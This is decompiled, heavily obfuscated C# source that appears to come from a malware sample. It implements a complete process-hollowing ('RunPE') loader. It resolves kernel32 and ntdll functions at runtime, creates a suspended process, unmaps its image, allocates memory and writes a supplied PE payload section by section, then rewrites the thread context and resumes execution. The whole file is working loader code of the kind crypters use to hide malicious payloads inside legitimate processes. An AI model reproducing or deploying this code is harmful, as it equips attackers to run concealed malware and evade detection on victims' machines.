using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace KaMaL;

[StandardModule]
public sealed class bjYtxkpuEAwYgtHgCIwhEvHqZSOWsuDFvgQNwxujSU
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool TRdyNsukGMxJCjMhszWzS(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, uint[] Part2);

	public delegate uint qIXPZvExEcBozDHkg(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt);

	public delegate uint WwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, IntPtr Part2);

	public delegate IntPtr uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool QyQfNUjrqIKPBzuHJhmYsw(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, uint[] Part2);

	public delegate bool bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool bYZNJkVwGLFXDIIpfGuxQcDVURBtH(IntPtr bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF(string bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] bXRCNJcODWIjPhAsxVonzYWbmQseoqmwt0);

	private static TRdyNsukGMxJCjMhszWzS trdyNsukGMxJCjMhszWzS_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<TRdyNsukGMxJCjMhszWzS>("kernel32", "SetThreadContext");

	private static qIXPZvExEcBozDHkg qIXPZvExEcBozDHkg_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<qIXPZvExEcBozDHkg>("kernel32", "ResumeThread");

	private static WwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt wwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<WwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt>("ntdll", "NtUnmapViewOfSection");

	private static uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE>("kernel32", "VirtualAllocEx");

	private static QyQfNUjrqIKPBzuHJhmYsw qyQfNUjrqIKPBzuHJhmYsw_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<QyQfNUjrqIKPBzuHJhmYsw>("kernel32", "GetThreadContext");

	private static bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge>("kernel32", "WriteProcessMemory");

	private static bYZNJkVwGLFXDIIpfGuxQcDVURBtH bYZNJkVwGLFXDIIpfGuxQcDVURBtH_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<bYZNJkVwGLFXDIIpfGuxQcDVURBtH>("kernel32", "ReadProcessMemory");

	private static sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF_0 = IhVkccohsULlmqEvxAGEmwrqLkGV<sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T IhVkccohsULlmqEvxAGEmwrqLkGV<T>(string CIKCHjX, string GZGyQFxnaGQdbuqkNUbgIpISSRSfX)
	{
		T result = (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref CIKCHjX), ref GZGyQFxnaGQdbuqkNUbgIpISSRSfX), typeof(T));
		Class6.smethod_3();
		return result;
	}

	public static bool sQmBlSvsXqvvKzVftxpBNMvtLyEhWBI(byte[] zjpIRljkYUsyckYbkrWtR, string SksRmtkwjdlWobNpzLWjLxLpowibkzI)
	{
		bool flag;
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(zjpIRljkYUsyckYbkrWtR, 60);
				int num2 = BitConverter.ToInt16(zjpIRljkYUsyckYbkrWtR, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(zjpIRljkYUsyckYbkrWtR, num + 84));
				if (sXucbtYZzojMtdYmJWdYAEYWZtlIYolXAqqqPDF_0(null, new StringBuilder(SksRmtkwjdlWobNpzLWjLxLpowibkzI), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (qyQfNUjrqIKPBzuHJhmYsw_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((bYZNJkVwGLFXDIIpfGuxQcDVURBtH_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)wwxIwpSJXtXGGdhHhcTHRfukdfJKIoHNSJDRt_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(zjpIRljkYUsyckYbkrWtR, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(zjpIRljkYUsyckYbkrWtR, num + 80));
							IntPtr part5 = uCOnLrwxQiOhQnxybnTlYgwqHuRKeGMtcdMNeHroNgAhnGmxcpwDWldE_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge_0(array[0], part5, zjpIRljkYUsyckYbkrWtR, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(zjpIRljkYUsyckYbkrWtR, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(zjpIRljkYUsyckYbkrWtR, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							bdYdDkFvffBXSaIlqhVPKMfFwrhiaqCnaDeUEHNuRWaMRhgpjcKge_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(zjpIRljkYUsyckYbkrWtR, num + 40));
							trdyNsukGMxJCjMhszWzS_0(array[1], array2);
						}
					}
					qIXPZvExEcBozDHkg_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				flag = false;
				ProjectData.ClearProjectError();
				goto IL_02c8;
			}
			flag = true;
			goto IL_02c8;
		}
		IL_02c8:
		bool result = flag;
		Class3.Class4.smethod_7();
		return result;
	}
}
